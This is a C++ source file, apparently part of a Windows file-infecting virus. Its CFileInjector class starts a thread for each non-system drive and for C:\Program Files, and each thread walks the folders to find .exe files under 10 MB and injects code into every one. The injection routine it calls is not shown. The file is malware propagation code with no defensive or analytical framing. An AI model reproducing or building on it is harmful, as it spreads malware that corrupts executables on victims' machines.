#include "StdAfx.h"
#include "FileInjector.h"
#include "Inject.h"
#include "FileFinder.h"
#include "Volume.h"
#include <atlstr.h>
#include <fstream>

CFileInjector::CFileInjector(void)
{
	CVolumeCollection volumes;
	for (CVolumeCollection::iterator it = volumes.begin();it != volumes.end();it++)
	{
		CString strLabel = (*it).Label();
		if (!strLabel.CollateNoCase(_T("A:\\")) || !strLabel.CollateNoCase(_T("B:\\"))
			|| !strLabel.CollateNoCase(_T("C:\\")))
			continue;
		CString* pstrLabel = new CString(strLabel);
		::CreateThread(NULL,NULL,InjectThread,pstrLabel,NULL,NULL);
	}

	CString* pstrC1 = new CString(_T("C:\\Program Files"));
	::CreateThread(NULL,NULL,InjectThread,pstrC1,NULL,NULL);
}


CFileInjector::~CFileInjector(void)
{
}


DWORD WINAPI CFileInjector::InjectThread(LPVOID lpParam)
{
	CString * pstrPath = (CString *)lpParam;
	CFileFinder finder(pstrPath->GetString(),TRUE);
	finder.SetNameFilter(_T("*.exe"));
	finder.SetSizeFilter(1,1024*1024*10);
	finder.StartSearching();

	while (finder.HasNext())
	{	
		CString strResult;
		BOOL bSuccess = finder.GetNextResult(strResult);
		if (bSuccess)
		{
			CInjection injection;
			injection.InjectFile((LPTSTR)strResult.GetString(),TRUE);
			::Sleep(500);
		}
		else
		{
			::Sleep(500);
		}
	}

	delete lpParam;
	return 0;
}